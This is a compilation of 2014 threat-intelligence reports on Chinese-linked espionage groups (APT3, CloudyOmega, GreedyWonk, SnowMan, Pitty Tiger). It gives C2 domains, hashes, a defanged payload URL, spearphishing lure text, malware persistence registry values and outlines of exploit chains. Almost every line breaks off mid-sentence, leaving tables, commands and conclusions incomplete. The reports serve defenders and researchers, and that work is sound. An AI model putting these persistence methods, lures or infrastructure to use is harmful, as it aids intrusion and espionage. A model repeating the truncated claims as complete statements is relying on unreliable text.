Using historic context archived within ThreatConnect , the TCIRT concluded that this Java applet is from
Driveby ( shared October 02 , 2014 )
The Windows PE Payload
The XOR 0xC8 encoded payload downloaded from [ http:]//mfa.gov[.]af / content / images / icon35.png
This executable is a self - extracting ( SFX ) Microsoft Cabinet executable that is digitally signed with a valid
This executable drops the following files :
Legitimate Microsoft Debugging Tools for Windows Executable , loads dbgeng.dll
Malicious DLL that loads into the above dllhost.exe , using a similar DLL sideloading technique to that
Malicious encrypted backdoor binary blob loaded by dbgeng.dll
This backdoor connects to the faux Oracle Java themed command and control ( C2 ) domain
Full indicators of this activity and a YARA rule to detect the malware certificate can be found in the
Conclusion
As the US and NATO reduce their troop levels in Afghanistan , China is posturing to fill the gap of
By exploiting and co - opting Afghan network infrastructure that is used by multiple ministerial level
It is important to consider that corporate enterprises are not immune to this tactic , and this is not just a
Just as attackers distribute malicious content to users en masse or CDN services distribute web content to
Intelligence Platform that enables enterprises to orchestrate the aggregation of Threat Intelligence from
Common Community shares and more .
Operation Double Tap
The use of CVE-2014 - 6332 is notable , as it demonstrates that multiple classes of actors , both criminal and
The Spearphish
The body of the message is below :
One Month 's Free Membership for The PLAYBOY ClUB 1080P HD VIDEOS 100,000 PHOTOS
Your Member referrals must remain active . If anyone getting " Promotion not available " for 1 month free
Clear out cookies or use another browser or use another PC .
The webpage contained both CVE-2014 - 6332 exploit code and a VBScript that invoked PowerShell on the
On Error Resume Next
Hidden ( New - Object
The CVE-2014 - 6332 exploit code seen in this incident is derived from the code published at
The Downloader
After the exploit or script executes , the system downloads install.exe , which has the following metadata :
Size          46592 bytes
Compile Time 2014 - 11 - 19 08:55:10Z
Import Hash       6b8611f8148a6b51e37fd68e75b6a81c
The file install.exe attempts to write two files ( doc.exe and test.exe ) to the hard - coded path
The first dropped file , doc.exe , contains the CVE-2014 - 4113 exploit and then attempts to execute test.exe
Size         12288 bytes
Import Hash 9342d18e7d315117f23db7553d59a9d1
Size         13824 bytes
Compile Time 2014 - 11 - 19 08:25:45Z
Import Hash 2fab77a3ff40e4f6d9b5b7e813c618e4
Size         11264 bytes
Compile Time 2014 - 11 - 18 10:49:23Z
Import Hash f34d5f2d4577ed6d9ceec516c1f5a744
These payload files also have interesting PDB debug strings .
The most interesting PDB string is the “ 4113.pdb , ” which appears to reference CVE-2014 - 4113 . This CVE is
The malware component , test.exe , uses the Windows command " cmd.exe " /C whoami ” to verify it is
When executed , the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port
Once the connection to the server is established , the malware expects a message containing at least three
Command        Description
C:\Users\
C:\Users\
C:\Users\
C:\Users\
C:\Users\
C:\Users\
Links to APT3
On October 28 , we observed APT3 sending out spearphishing messages containing a compressed
The 192.184.60.229 IP address seen in this current campaign also hosts securitywap[.]com – another
In addition , the join.playboysplus[.]com exploit and payload delivery site resolves to 104.151.248.173 .
This IP has hosted other domains used by APT3 in past campaigns :
As we discussed in our previous blog detailing previous APT3 activity , the walterclean[.]com served as a
Plugx / Kaba command and control server .
Conclusion
Although APT3 is well known for employing zero - day exploits in their attacks , recent activity has
Since Operation Clandestine Fox , we have observed this actor execute multiple attacks that did not rely on
Operation CloudyOmega : Ichitaro zero - day and ongoing
Japanese organizations .
The exploit is sent to the targeted organizations through emails with a malicious Ichitaro document file
The content of the emails vary depending on the business interest of the targeted recipient ’s organization ;
As Security Response previously discussed , unpatched vulnerabilities being exploited is nothing new for
Ichitaro . However , during our investigation of this Ichitaro zero - day attack , we discovered that the attack
Backdoor . Emdivi are persistently used as a payload . All attacks arrive on the target computers as an
However , some of the files exploit software vulnerabilities , and the aforementioned vulnerability in
Ichitaro software is only one of them . This group ’s primary goal is to steal confidential information from
Timeline
The first attack of the campaign can be traced back to at least 2011 . Figure 1 shows the targeted sectors
Figure 1 . Targeted sectors and number of attacks
Attack vector
Email is the predominant infection vector used in this campaign .
Figure 2 . Sample email used in attack campaign
Figure 2 is an example of an email used in recent attacks prior to those exploiting the Ichitaro zero - day
The file in the attachment has a Microsoft Word icon but , as indicated within Windows Explorer , it is an
Figure 3 . Attached “ document ” is actually a malicious executable file
Payload
The malicious payload is Backdoor . Emdivi , a threat that opens a back door on the compromised
Each Emdivi variant has a unique version number and belongs to one of two types : Type S and Type T.
The unique version number is not only a clear sign that Emdivi is systematically managed , but it also acts
Both Emdivi Type S and Type T share the following functionality :
Allow a remote attacker to execute code through HTTP
Steal credentials stored by Internet Explorer
Type T is primarily used in Operation CloudyOmega , has been in constant development since the
Debugger
Sandbox
Type S , on the other hand , was used only twice in the attack campaign . Type S is a .NET application based
Figure 4 . Japanese text used by Emdivi Type S variant
Who is Emdivi talking to ?
Once infected , Emdivi connects to hardcoded C&C servers using the HTTP protocol .
So far , a total of 50 unique domains have been identified from 58 Emdivi variants . Almost all websites
Figure 5 . Single IP hosts multiple compromised websites
The compromised sites are hosted on various pieces of web server software , such as Apache and Microsoft
Internet Information Services ( IIS ) , and are on different website platforms . This indicates that the sites
Backdoor . Emdivi .
The compromised cloud hosting company has been notified but , at the time of writing , has not replied .
Symantec offers two IPS signatures that detect and block network communication between infected
System Infected : Backdoor . Emdivi Activity
System Infected : Backdoor . Emdivi Activity 2
Zero - day and links to other cybercriminal groups
During our research , multiple samples related to this attack campaign were identified and allowed us to
In August 2012 , the CloudyOmega attackers exploited the zero - day Adobe Flash Player and AIR
Interestingly , the Flash file that was used in an Emdivi attack in 2012 and the one used in the LadyBoyle
Figure 6 shows the malformed SWF file executing LadyBoyle ( ) code that attempts to exploit the Adobe
Flash Player CVE-2013 - 0634 Remote Memory Corruption Vulnerability ( CVE-2013 - 0634 ) . The Flash file
Figure 6 . Malformed SWF file used in the LadyBoyle campaign in February 2013
Both attacks use a .doc file containing an Adobe Flash zero - day exploit that is used to install a back door .
No other evidence connects these two different campaigns ; however , as described previously in Symantec
Security Response ’s Elderwood blog , it is strongly believed that a single parent organization has broken
In terms of the latest attack on Ichitaro , we collected a dozen samples of JTD files , all of which are exactly
Backdoor . ZXshell ) were observed in the latest zero - day attack .
Figure 7 . Parent group sharing zero - day exploit
Conclusion
Operation CloudyOmega was launched by an attack group that has communication channels with other
Protection summary
It is highly recommended that customers using Ichitaro products apply any patches as soon as possible .
Symantec offers the following protection against attacks associated with Operation CloudyOmega :
Backdoor . Emdivi
Backdoor . Emdivi!gen1
Backdoor . Emdivi!gen2
Bloodhound . Exploit.557
Trojan . Mdropper
System Infected : Backdoor . Emdivi Activity
System Infected : Backdoor . Emdivi Activity 2
Operation GreedyWonk : Multiple Economic and Foreign Policy Sites
Compromised , Serving Up Flash Zero - Day Exploit
Less than a week after uncovering Operation SnowMan , the FireEye Dynamic Threat Intelligence cloud
We are collaborating with Adobe security on this issue . Adobe has assigned the CVE identifier CVE-2014-
As of this blog post , visitors to at least three nonprofit institutions — two of which focus on matters of
We ’re dubbing this attack “ Operation GreedyWonk . ”
We believe GreedyWonk may be related to a May 2012 campaign outlined by ShadowServer , based
The group behind this campaign appears to have sufficient resources ( such as access to zero - day exploits )
Discovery
On Feb. 13 , FireEye identified a zero - day Adobe Flash exploit that affects the latest version of the Flash
Player ( 12.0.0.4 and 11.7.700.261 ) . Visitors to the Peter G. Peterson Institute for International Economics
We subsequently found that the American Research Center in Egypt ( www.arce[.]org ) and the Smith
Richardson Foundation ( www.srf[.]org ) also redirected visitors the exploit server . All three organizations
Mitigation
To bypass Windows’ Address Space Layout Randomization ( ASLR ) protections , this exploit targets
Windows XP
Windows 7 and Java 1.6
Windows 7 and an out - of - date version of Microsoft Office 2007 or 2010
Users can mitigate the threat by upgrading from Windows XP and updating Java and Office . If you
These mitigations do not patch the underlying vulnerability . But by breaking the exploit ’s ASLR - bypass
Vulnerability analysis
The attack uses only known ASLR bypasses . Details of these techniques are available from our previous
For Windows XP , the attackers build a return - oriented programming ( ROP ) chain of MSVCRT ( Visual C
On Windows 7 , the attackers use a hard - coded ROP chain for MSVCR71.dll ( Visual C++ runtime ) if the
Microsoft Office 2007 or 2010 .
Java 1.6 is no longer supported and does not receive security updates . In addition to the MSVCR71.dll
The Microsoft Office HXDS.dll ASLR bypass was patched at the end of 2013 . More details about this
Shellcode analysis
The shellcode is downloaded in ActionScript as a GIF image . Once ROP marks the shellcode as executable
Finally , it runs the file using the WinExec function .
Once the exploit succeeds , a PlugX / Kaba remote access tool ( RAT ) payload with the MD5 hash
This PlugX payload was configured with the following command - and - control ( CnC ) domains :
Sample callback traffic was as follows :
Accept : * / *
User - Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.1 ;
Host : java.ns1.name
Content - Length : 0
Connection : Keep - Alive
Cache - Control : no - cache
Campaign analysis
Both java.ns1[.]name and adservice.no-ip[.]org resolved to 74.126.177.68 on Feb. 18 , 2014 . Passive DNS
Domain                   First Seen     Last Seen         IP Address
Further research uncovered a number of older malware samples connecting to the same domain
Time
Ivy
Ivy
Ivy
Domain                  First Seen    Last Seen        IP Address
The Poison Ivy variants that connected to the domain wmi.ns01[.]us had the following unique
We found a related Poison Ivy sample ( MD5 8936c87a08ffa56d19fdb87588e35952 ) with the same “ java7 ”
This exploit server hosted a Flash exploit file named BrightBalls.swf ( MD5
Using passive DNS analysis , we see the domains windows.ddns[.]us and wmi.ns01[.]us both resolved to
Domain               First Seen        Last Seen        IP Address
During another earlier compromise of the same www.cdi.org website , visitors were redirected to a Java
Domain               First Seen        Last Seen          IP Address
The Poison Ivy sample referenced above ( MD5 fd69793bd63c44bbb22f9c4d46873252 ) was delivered via
In this case , visitors were redirected from www.ceps[.]be to a Java exploit hosted on shop.fujifilm[.]be .
In what is certainly not a coincidence , we also observed www.arce[.]org ( one of the sites redirecting to the
Conclusion
This threat actor clearly seeks out and compromises websites of organizations related to international
This actor also has early access to a number of zero - day exploits , including Flash and Java , and deploys a
Operation Poisoned Handover : Unveiling Ties Between APT Activity
As the pro - democracy movement in Hong Kong has continued , we ’ve been watching for indications of
In recent weeks , attackers have launched a series of Distributed Denial of Service attacks ( DDoS ) against
Next Media ’s Apple Daily publication have suffered from an ongoing DDoS attack that “ brought down its
The use of DDoS attacks as a political tool during times of conflict is not new ; patriotic hacktivist groups
In this case , however , we ’ve discovered an overlap in the tools and infrastructure used by China - based
Ongoing DDoS Attacks Target the Pro - Democracy Movement
These binaries are W32 Cabinet self - extracting files that drop a variant of an older DDoS tool known as
The KernelBot implants receive targeting instructions from C2 servers hard - coded directly into the
On Oct. 21 , the control server at wakayamasatei[.]com responded with the following encoded
This configuration file can be decoded by stripping the leading and trailing @$@ characters . At this point ,
Timer=2
Timer=360
Timer=20
Timer=20
Timer=20
Timer=20
Timer=20
Timer=20
During the course of our research , we ’ve observed more than 30 different unique configuration files issued
All of the above IPs host Next Media or Apple daily websites , with the exception of 58.64.139.10 and
For approximately 14 hours between October 23rd and 24th , the attackers pushed a configuration update
The IP 124.217.214.149 hosted the attacker controlled domain p.java-sec[.]com .
On Oct. 23 , 2014 , two of the active controls began instructing participating bots to cease attacks . By Oct.
It should come as no surprise that hkgolden[.]com , nextmedia[.]com , and appledaily.com[.]hk websites
Links to Previous Activity
The most direct connection between these DDoS attacks and previous APT activity is the use of the QTI
International and CallTogether code signing certificates , which we have seen in malware attributed to APT
The QTI International digital certificate has been previously used to sign binaries used in APT activity
The sample 0b54ae49fd5a841970b98a078968cb6b was signed with the QTI International certificate as
The QTI International certificate was also used to sign e2a4b96cce9de4fb126cfd5f5c73c3ed . We detect
Livelihood on June 26 , 2014 , which appeared as the following :
More recently , as noted by Claudio Guarnieri , the website of the Democratic Party of Hong Kong was
The CallTogether certificate has been used to sign ecf21054ab515946a812d1aa5c408ca5 . We also detect
Both of these certificates are valid but can be detected and blocked via the following Yara signatures :
These ongoing DDoS attacks and previous APT intrusion activity both target the hkgolden[.]com website .
As noted above , this site has been targeted with a DDoS attack by a KernelBot network . We also found that
Finally , as noted above the IP 124.217.214.149 was seen hosting the domain p.java-sec[.]com between Oct.
It is unclear why these actors would attack an IP address they were actively using . It ’s possible that the
Conclusion
While not conclusive , the evidence presented above shows a link between confirmed APT
Poisoned Hurricane . Rather , the evidence may indicate that a common quartermaster supports
In either scenario , there is a clear connection between the intrusion activity documented in Operation
Poisoned Hurricane and the DDOS attacks documented here . While the tactics of these activities are very
Hurricane ’s objective appeared to have in part been IP theft possibly for economic gain or other
This entry was posted in Threat Intelligence , Threat Research and tagged advanced malware ,
Cybersecurity , malware , zero - day by Ned Moran , Mike Oppenheim and Mike Scott . Bookmark the
Operation SnowMan : DeputyDog Actor Compromises US Veterans of
Foreign Wars Website
On February 11 , FireEye identified a zero - day exploit ( CVE-2014 - 0322 ) being served up from the U.S.
Veterans of Foreign Wars’ website ( vfw[.]org ) . We believe the attack is a strategic Web compromise
This blog post examines the vulnerability and associated attacks , which we have dubbed “ Operation
Exploit / Delivery analysis
After compromising the VFW website , the attackers added an iframe into the beginning of the website ’s
Flash object , which orchestrates the remainder of the exploit . The exploit includes calling back to the IE 10
Mitigation
The exploit targets IE 10 with Adobe Flash . It aborts exploitation if the user is browsing with a different
Vulnerability analysis
The vulnerability is a previously unknown use - after - free bug in Microsoft Internet Explorer 10 . The
Gain access to memory from Flash ActionScript , bypassing address space layout randomization
Pivot to a return - oriented programing ( ROP ) exploit technique to bypass data execution prevention
The attacker uses the Microsoft . XMLDOM ActiveX control to load a one - line XML string containing a file
Because the vulnerability allows attackers to modify memory to an arbitrary address , the attacker can use
Code execution
Once the attacker ’s code has full memory access through the corrupted Flash Vector object , the code
Shellcode analysis
Subsequently , the malicious Flash code downloads a file containing the dropped malware payload . The
Windows API call .
As documented above , this exploit dropped an XOR ( 0×95 ) payload that executed a ZxShell backdoor
Foreign Wars website . A possible objective in the SnowMan attack is targeting military service members to
Thursday amid a severe winter storm .
The ZxShell backdoor is a widely used and publicly available tool used by multiple threat actors linked to
Infrastructure analysis
The info[.]flnet[.]org domain overlaps with icybin[.]flnet[.]org and book[.]flnet[.]org via the previous
First Seen        Last Seen          CnC Domain            IP
We previously observed Gh0stRat samples with the custom packet flag “ HTTPS ” calling back to
The me[.]scieron[.]com domain previously resolved to 58.64.199.22 . The book[.]flnet[.]org domain also
Others domain seen resolving to this same /24 subnet were dll[.]freshdns[.]org , ali[.]blankchair[.]com ,
First Seen        Last Seen          CnC Domain              IP
A number of other related domains resolve to these IPs and other IPs also in this /24 subnet . For the
You may recall that dll[.]freshdns[.]org , ali[.]blankchair[.]com and cht[.]blankchair[.]com were all linked
Figure 1 : Ties between Operation SnowMan , DeputyDog , and Ephemeral Hydra
Links to DeputyDog and Ephemeral Hydra
Other tradecraft similarities between the actor(s ) responsible for this campaign and the actor(s )
The use of zero - day exploits to deliver a remote access Trojan ( RAT )
The use of strategic web compromise as a vector to distribute remote access Trojans
The use of a simple single - byte XOR encoded ( 0×95 ) payload obfuscated with a .jpg extension
The use of Gh0stRat with the “ HTTPS ” packet flag
The use of related command - and - control ( CnC ) infrastructure during the similar time frames
We observed many similarities from the exploitation side as well . At a high level , this attack and the CVE-
They build ROP chains and shellcode the same way , both choose to corrupt a Flash Vector object , have
Conclusion
These actors have previously targeted a number of different industries , including :
U.S. government entities
Japanese firms
Defense industrial base ( DIB ) companies
Law firms
Information technology ( IT ) companies
Mining companies
Non - governmental organizations ( NGOs )
The proven ability to successfully deploy a number of different private and public RATs using zero - day
This entry was posted in Advanced Malware , Exploits , Targeted Attack , Threat Research , Vulnerabilities
Bookmark the permalink .
Pitty Tiger Group
The Eye of the Tiger
Credits :                      Ivan FONTARENSKY                            Malware Research
Fabien PERIGAUD                             Reverse Engineering
Ronan MOUCHOUX                              Threat Intelligence
Cedric PERNET                               Threat Intelligence
David BIZEUL                                Head of CSIRT
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Operation Pitty Tiger – “ The Eye of the Tiger ”
Cyber espionage has been a hot topic through the last years . Computer attacks known as “ APT ”
Today , we decided to release publicly information on a specific group of APT attackers known as
Pitty Tiger is a group of attackers that have been active since at least 2011 . They have targeted
We have been able to track down this group of attackers and can provide detailed information
Our investigations indicate that Pitty Tiger has not used any 0day vulnerability so far , rather they
Pitty Tiger is probably not a state - sponsored group of attackers . They lack the experience and
We have been able to leverage several attackers profiles , showing that the Pitty Tiger group is
At the end of this report , we provide indicators of compromise to help people detect current Pitty
Tiger attacks .
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Reconnaissance phase .......................................................................................................... 5
Initial compromise .................................................................................................................. 6
Access strengthening & lateral moves ................................................................................... 6
Data exfiltration ...................................................................................................................... 7
Spear Phishing and weaponized documents ......................................................................... 9
Direct attacks ....................................................................................................................... 10
Troj / ReRol . A ........................................................................................................................ 12
Paladin RAT ........................................................................................................................ 26
Leo RAT .............................................................................................................................. 28
Common characteristics between the two domains ............................................................. 35
Other domains linked with the Pitty Tiger group ................................................................... 36
Attacker ’s connections to the c&c ........................................................................................ 40
Roles and organization ........................................................................................................ 48
Attackers arsenal ................................................................................................................. 49
Domains .............................................................................................................................. 57
Malware hashes ................................................................................................................... 57
Malware Strings ................................................................................................................... 58
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
It can be summarized by the following scheme :
The reconnaissance phase commences when an attacker selects a new target and involves the
There is very little information available about this phase , and there is little data about it . The only
The longer the attackers spend time in attempting to understand their target and its online presence ,
This reconnaissance phase is both about finding information to break into the targeted network
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
This phase mostly relies on open sources from the Internet : social networks , press releases , white
At this stage , the APT attackers have a solid knowledge of their target and its key employees . The
The attackers mostly rely on two techniques here to infect one or several computers , usually
Spear phishing can be described as targeted e - mail phishing . In a spear phishing scheme , attackers
Some groups of attackers also use “ watering hole ” techniques to successfully compromise their
Direct attacks against servers of the target can also be a way to penetrate the target ’s network .
Attackers have gained access to one or several machines inside the target ’s corporate network .
They need to install several different backdoors in order to be able to always access the network . In
As soon as the attackers are sure they have enough access , they start looking for two things :
They use lateral moves between machines inside the network , and look for everything they need .
This step is very hard to detect , since they only use valid credentials and legitimate administration
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Data exfiltration is the last step before the attackers loop to the lateral moves step , in a never - ending
They generally create archive files containing the content they want to exfiltrate , which are then sent
This phase is not the end of an APT attack . The attackers loop to the access strengthening / lateral
For more information about all the APT phases , please refer to our APT Kill Chain blog post serie1 .
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
During our regular investigations on APT cases , one particular variant of malware caught our
We discovered this malware sample in June 2014 , leading to a command & control ( c&c ) server still
Our researches around this particular malware family revealed the “ Pitty Tiger ” group has been
This group uses other malware and tools during their APT operations , in addition to the PittyTiger
A variant of the infamous Gh0st RAT dubbed “ Paladin ” has been used repeatedly by the PT group ,
Troj / Goldsun - B ) , and “ CT RAT ” . Another variant of Gh0st RAT named “ Leo ” has been found inactive
We also found another malware , named “ Troj / ReRol . A ” . This one is also used by the group to infect
Pitty Tiger campaigns , generally embedded in Microsoft Office documents .
Thanks to server ’s misconfigurations , we managed to get information from three c&c servers used
July 2014 .
Our investigation has been focused on the data we could get from these c&c servers but also on the
Pitty Tiger environment .
This whitepaper aims to expose the view we have on the group , especially on their infrastructure
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Pitty Tiger , like most other APT groups , use spear phishing e - mails extensively in order to gain an
We have been able to find a spear phishing e - mail crafted by the attackers . This e - mail spoofed the
From : XXXXXXX
To : XXXXXXX
File : 1 Attachment : Bird ’s Eye Point of View.doc
While the holiday season means clustering clustering ‘ time for a
Remember to look down !
The attached file is a Microsoft Office Word document triggering CVE-2014 - 1761 to infect the
Word document used to infect computers with Troj / ReRol . A
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
While this example looks very “ amateur ” for a spear phishing attempt , we suppose the group has
Word documents showing content stolen from victims of the group . These documents were infecting
This could mean that the Pitty Tiger group is using stolen material as spear phishing content either
Pitty Tiger also seem to use fake Microsoft Office Excel content , yet we could only find empty
Although we have not been able to find evidences of any attack aimed at exploiting vulnerabilities on
The attackers have been using different vulnerability scanners aimed at their targets . While some
We have also been able to testify that the Pitty Tiger group has successfully collected information on
Memory data leak from one server – Heartbleed exploit on one of PittyTiger ’s targets
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Running automated vulnerability scanners on whole ranges of IP addresses used by the targets or
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
One of the favorite methods used by the Pitty Tiger group to infect users is to use a Microsoft Office
Word document which exploits a specific vulnerability .
The payload infecting the system is malware known as “ Troj / ReRol . A ” . It is generally the first step of
Exploitation
We have been able to find one such document1 used by that group of attacker , exploiting CVE-
We discovered several different documents spreading this malware by triggering CVE-2012 - 0158
The discovery of this “ old ” vulnerability exploitation in June 2014 could mean that the Pitty Tiger
The Word document we initially found was probably a “ test ” document used by the group . When
Microsoft Office Word decoy “ test document ” used by the Pitty Tiger group
Installation
When successfully triggered , the exploit infects the host by dropping and executing a file named
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
This binary is “ Troj / ReRol . A ” according to Sophos naming convention1 . It immediately triggers
Alarms in our sandbox system , triggered by the Troj / ReRol . A malware
The binary drops a copy of itself in the Application Data folder of the currently logged - in user :
Creation of a copy of the Pitty Tiger malware in a user folder in our sandbox
The malware initiates a communication to time.windows.com to check for connectivity , and then
A / detailed - analysis.aspx
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Beginning of an encrypted communication between the Troj / ReRol . A malware and its c&c server
Very few variants of Troj / ReRol . A are public . The variants we have seen did use that same User-
Agent :
Mozilla/4.0 ( compatible ; )
The persistence mechanism used by the malware is the creation of a registry key named “ Shell ”
Key Path : \REGISTRY\USER\<SID>\Software\Microsoft\Windows
Value Name : Shell
Value : explorer.exe,C:\DOCUME~1\XXXXXX\APPLIC~1\svohost.exe ,
The payload of this malware is used to collect information on the newly infected host , and send it
Command & Control
The data sent in the POST request has a 0x11 bytes header consisting of a fixed - value byte ( 0xc3 )
We have been able to decrypt the communications and confirmed what is transmitted to the c&c
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Here is an anonymized sample of communication showing information collected by the malware :
Windows 7 Enterprise Service Pack 1 6.1 7601
Organization :
Owner : xxx
--------------Server Info-------------------
--------------Soft Info-------------------
Adapt Type : Ethernet
Description :      Realtek RTL8139C+ Fast Ethernet NIC
Sample information collected by Troj / ReRol . A malware
This information is very useful for an attacker : it shows all software installed on the system , and
Once this data has been transferred to the c&c server , it responds by sending additional malware to
The c&c part consists of two files :
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
The dr.asp registers the following keywords :
These two binaries were no longer available on the server . However , we found various files which
The 322.exe file is a legitimate , Chinese , calc.exe tool . It might have been used by the attackers to
The 3 others binaries are RATs , which will be detailed in the next parts .
This RAT is the origin of the attackers’ group name . “ PittyTiger ” is a mutex used by the malware .
Installation
The malware1 , when running in our sandbox , triggers the following alarms :
Alarms in our sandbox system , triggered by the PittyTiger malware
The binary drops two files in “ C:\Windows\System32 ” :
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Files dropped by the PittyTiger RAT in our sandbox
The “ qmgrxp.exe ” binary is a simple copy of the original binary . It drops the “ packet64.dll ” , and
Persistence is achieved by adding the path to the binary to the WinlogonUserInit key :
Key Path : \REGISTRY\USER\<SID>\Software\Microsoft\Windows
Value Name : UserInit
Value : C:\WINDOWS\system32\userinit.exe , C:\WINDOWS\system32\qmgrxp.exe ,
The “ packet64.dll ” is the main payload of the RAT . After being injected , it starts sending its Hello
Sample communication from PittyTiger RAT
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Command & Control
All the requests sent to the c&c contains the string “ /FC001/ ” followed by the bot i d . This i d consists
The data sent is simply encoded using base64 , there is no cipher at all . The hello packet , once
Version : NULL
Our sample had 3 c&c servers configured :
The following commands are implemented :
Regarding the controller part , we found two different versions :
The interface handling both Pitty TIGER and CT connections is very interesting . We have been able
Pitty Tiger RAT – controller part
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
This remote administration tool is often used by the Pitty Tiger group . We have been able to acquire
We found two instances of the same binary with different names – 32mm.exe and mm32.exe1 .
This RAT seems to be an evolution of PittyTiger , since a specific server binary we found could
Moreover , the same commands are implemented in both RATs .
Installation
Unsurprisingly , when running in our sandbox , the RAT triggers the same alarms as PittyTiger :
Alarms in our sandbox system , triggered by the CT RAT
The binary drops two files in “ C:\Program Files\Internet Explorer ” :
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Files dropped by the CT RAT in our sandbox
The “ ieupdate.exe ” is a simple binary to inject the DLL into “ explorer.exe ” .
Persistence is achieved via the following registry key :
Key Path : \REGISTRY\USER\<SID>\Software\Microsoft\Windows
Value Name : load
Value : c:\PROGRA~1\INTERN~1\ieupdate.exe
After injection , the RAT sends a first login packet to its c&c :
Encrypted communication from a machine infected with CT RAT
Command & Control
The RAT communication is performed through HTTP requests . The data is sent encrypted with
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
The Login packet contains the following string , after decoding and deciphering :
Login
->C : PC - XXX
->U : User - XXX
->L:10.10.10.1
->S : Microsoft Windows XP Service Pack 3 5.1 2600
->M : Nov 13 2013
->P:1033
It contains the computer name , the user name , the internal IP address , the OS version , the RAT
The RAT can then receive commands from its c&c . Usual RAT features are implemented :
Version and author(s )
Regarding the configuration , our sample communicates with “ sop.avstore.com.tw ” , and contains the
The c&c part is a Windows binary written in .NET . We found 2 versions :
The About form gives the name of the developer(s ) :
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
The version of the controller which can handle both PittyTiger and CT shows the same author(s ) :
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
As these screenshots show , the switch between PittyTiger and CT was probably in the last semester
The text can be translated , thanks to Google Translate , as :
Further discussion about this author is provided in subsequent sections .
We named this malware “ MM RAT ” at the beginning of our investigation , before we found an
Installation
The binary we found is named 3200.exe1 , and triggers the following alarms in our sandbox :
Alarms in our sandbox system , triggered by the Troj / Goldsun - B malware
The “ release.tmp ” file is dropped on the system :
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
File dropped by the malware in our sandbox
The binary is also copied to the user ’s “ Application Data ” directory , and injects the “ release.tmp ” file
Persistence is achieved by adding the path to the binary to the Winlogon Shell key :
Key Path : \REGISTRY\USER\<SID>\Software\Microsoft\Windows
Value Name : Shell
Value : explorer.exe,C:\DOCUME~1\<UserName>\APPLIC~1\<binary name > ,
The RAT embeds its own DNS server IP addresses to make the c&c domain names resolutions .
These addresses are listed below :
Command & Control
It starts resolving its domains after injection , and immediately sends requests . First requests are
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Hello packet sent by Troj / Goldsun - B to its c&c server
The bot then repeatedly sends GET requests on “ /httpdocs / mm/<bot_id>/ComMand.sec ” to retrieve
The communication protocol is quite simple : GET requests are used to receive data from the c&c ,
The following features are implemented :
The following CGI files can be requested by the bot :
The configuration is stored locally in a file called “ schmup.sys ” . The file is ciphered using RC4 , using
Our sample uses “ mca.avstore.com.tw ” , “ star.yamn.net ” and “ bz.kimoo.com.tw ” as c&c servers . It
Unlike others c&c binaries , the c&c part of this RAT does not have a graphical interface , but can be
The management protocol is the same as the bots protocol , with different CGI files :
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
The bots’ answers to remote commands can be retrieved by requesting the “ Reply.sec ” file ( e.g.
Network patterns
These network patterns might ring bells in some researcher ’s minds . The network communication
An examination of the code did not reveal code similarities with the Enfal malware . We do not
This is another remote administration tool used by the Pitty Tiger group . We have been able to get
Installation
The binary we found was dropped by a malicious Word document . The following alarms are
Alarms in our sandbox system , triggered by the Paladin RAT
The shellcode contained in the Word file drops the following file , and executes it :
This one drops in turn the following file :
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
File dropped by the malware in our sandbox
